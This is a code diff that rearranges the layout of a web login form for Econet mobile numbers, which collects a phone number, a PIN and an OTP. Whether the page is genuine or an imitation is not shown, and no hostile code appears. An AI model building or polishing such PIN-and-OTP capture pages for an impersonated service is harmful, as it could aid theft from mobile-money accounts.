@@ -52,7 +52,7 @@ input:invalid{border-color:#d04444}
   border-radius:8px;
 }
 
-/* INLINE ERROR — CSS ONLY */
+/* ✅ INLINE ERROR — GUARANTEED */
 .phone-error{
   display:none;
   font-size:13px;
@@ -95,16 +95,19 @@ input:invalid{border-color:#d04444}
     <label>Mobile Number</label>
     <div class="phone-wrap">
       <div class="prefix">+263</div>
-      <input
-        id="phone"
-        inputmode="numeric"
-        required
-        pattern="7\d{8}"
-        placeholder="7XXXXXXXX"
-      >
-    </div>
-    <div class="phone-error">
-      Input 9-digit Econet number starting with 7
+      <div style="flex:1">
+        <input
+          id="phone"
+          inputmode="numeric"
+          required
+          pattern="7\d{8}"
+          placeholder="7XXXXXXXX"
+        >
+        <!-- 🔴 MUST BE HERE -->
+        <div class="phone-error">
+          Input 9-digit Econet number starting with 7
+        </div>
+      </div>
     </div>
 
     <label style="margin-top:10px">Enter your PIN</label>
@@ -115,14 +118,13 @@ input:invalid{border-color:#d04444}
       <input class="pin-digit" maxlength="1" inputmode="numeric">
     </div>
 
-    <!-- honeypot -->
     <input type="text" id="hp" style="display:none">
 
     <button id="loginBtn" class="btn" type="submit">LOGIN</button>
   </form>
 </div>
 
-<!-- OTP MODAL -->
+<!-- OTP MODAL (UNCHANGED) -->
 <div id="otpModal" class="otp-modal" style="display:none">
   <div class="otp-box">
     <strong>Enter OTP</strong>
